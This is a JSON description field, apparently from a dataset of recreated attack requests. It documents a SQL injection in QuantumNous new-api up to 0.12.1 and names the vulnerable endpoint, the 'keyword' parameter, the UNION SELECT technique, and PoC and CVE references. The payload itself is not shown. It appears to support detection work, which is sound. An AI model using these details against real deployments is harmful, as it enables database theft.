     "description": "QuantumNous new-api up to 0.12.1 is vulnerable to SQL injection in the self top-up search endpoint. The controller GetUserTopUps reads keyword := c.Query(\"keyword\") and passes it to model.SearchUserTopUps / SearchAllTopUps in model/topup.go, where it is concatenated into the query without proper preparation. The request sends a UNION SELECT payload in the 'keyword' query parameter of GET /api/user/topup/self. No vendor WAF rule found; the endpoint, route prefix and parameter were confirmed from the project source (router/api-router.go, controller/topup.go) and the public PoC.\n\nReferences used to recreate this request:\n- https://gist.github.com/YLChen-007/cf501d0a66c81298b2f97e854f3813db (PoC)\n- https://github.com/QuantumNous/new-api (source: router/api-router.go selfRoute.GET(\"/topup/self\", controller.GetUserTopUps); controller/topup.go keyword := c.Query(\"keyword\"); model/topup.go SearchUserTopUps/SearchAllTopUps)\n- https://vuldb.com/vuln/365252 (VulDB record)\n- https://www.cve.org/CVERecord?id=CVE-2026-9305 (CVE record)",
